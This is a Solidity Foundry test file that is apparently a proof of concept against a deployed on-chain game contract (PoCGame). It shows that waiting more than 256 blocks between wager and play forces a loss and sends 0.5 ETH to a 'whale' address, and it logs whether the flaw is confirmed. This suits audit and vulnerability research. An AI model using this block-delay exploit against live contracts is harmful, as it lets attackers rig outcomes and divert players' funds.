// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import {console2} from "forge-std/console2.sol";
import "../src/0x7d09edb07d23acb532a82be3da5c17d9d85806b4.sol";

contract MockWhale {
    function donate() external payable {}
}

contract PoCGameTest is Test {
    PoCGame game;
    MockWhale whale;
    address alice = address(0x2);

    function setUp() public {
        whale = new MockWhale();
        game = new PoCGame(address(whale), 1 ether);
        vm.prank(address(this));
        game.AdjustDifficulty(1); // Always loses with difficulty=1
        vm.prank(address(this));
        game.OpenToThePublic();
    }

    function testMinersCanForceLossByBlockDelay() public {
        console2.log("--- BEFORE-Trigger WhaleState ---");
        uint256 whaleBefore = address(whale).balance;
        uint256 winnersPotBefore = game.winnersPot();
        uint256 gameBalBefore = game.ethBalance();
        console2.log("Whale balance:", whaleBefore);
        console2.log("Winners pot:", winnersPotBefore);
        console2.log("Game ETH balance:", gameBalBefore);
        
        console2.log("--- BEFORE-Trigger WhaleState, completed ---");
        
        vm.deal(alice, 1 ether);
        
        console2.log("--- Trigger: Wager and Play after 257 blocks ---");
        vm.roll(100); // Set block number 100
        vm.startPrank(alice, alice);
        console2.log("Calling game.wager()");
        game.wager{value: 1 ether}();
        vm.stopPrank();
        
        // Skip 257 blocks to expire blockhash resolution
        vm.roll(357);

        vm.startPrank(alice, alice);
        console2.log("Calling game.play()");
        game.play();
        vm.stopPrank();

        console2.log("--- AFTER-Trigger WhaleState ---");
        uint256 whaleAfter = address(whale).balance;
        uint256 winnersPotAfter = game.winnersPot();
        uint256 gameBalAfter = game.ethBalance();
        console2.log("Whale balance:", whaleAfter);
        console2.log("Winners pot:", winnersPotAfter);
        console2.log("Game ETH balance:", gameBalAfter);
        
        console2.log("--- AFTER-Trigger WhaleState, completed ---");

        console2.log("[Comparison]");
        console2.log("Whale balance change:", whaleAfter - whaleBefore);
        console2.log("Winners pot change:", winnersPotAfter - winnersPotBefore);
        console2.log("Game ETH balance change:", gameBalAfter - gameBalBefore);
        
        bool whaleBalanceIncreased = whaleAfter == whaleBefore + 0.5 ether;
        if(whaleBalanceIncreased) {
            console2.log("Vulnerability Confirmed: Whale received +0.5 ETH");
            console2.log("Vulnerability Exists: Attackers can force loss via block delay");
        } else {
            console2.log("Vulnerability not Detected: Whale balance didn't increase by 0.5 ETH");
            console2.log("Vulnerability not Exist: Forced loss via block delay failed");
        }
    }
}